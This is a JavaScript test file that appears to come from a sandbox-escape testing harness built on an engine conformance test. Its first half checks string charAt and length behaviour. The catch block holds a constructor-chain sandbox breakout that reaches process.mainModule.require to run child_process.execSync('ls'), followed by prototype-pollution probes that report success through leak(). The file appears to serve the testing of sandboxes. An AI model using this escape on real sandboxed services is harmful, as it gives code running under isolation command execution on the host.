try {
    if ('abc123'.charAt(5) !== '3') {
        $ERROR('#1: "abc123".charAt(5) === "3". Actual: ' + 'abc123'.charAt(5));
    }
    if ('abc123'['charAt'](0) !== 'a') {
        $ERROR('#2: "abc123"["charAt"](0) === "a". Actual: ' + 'abc123'['charAt'](0));
    }
    if ('abc123'.length !== 6) {
        $ERROR('#3: "abc123".length === 6. Actual: ' + 'abc123'.length);
    }
    if ('abc123'['length'] !== 6) {
        $ERROR('#4: "abc123"["length"] === 6. Actual: ' + 'abc123'['length']);
    }
    if (new String('abc123').length !== 6) {
        $ERROR('#5: new String("abc123").length === 6. Actual: ' + new String('abc123').length);
    }
    if (new String('abc123')['charAt'](2) !== 'c') {
        $ERROR('#6: new String("abc123")["charAt"](2) === "c". Actual: ' + new String('abc123')['charAt'](2));
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}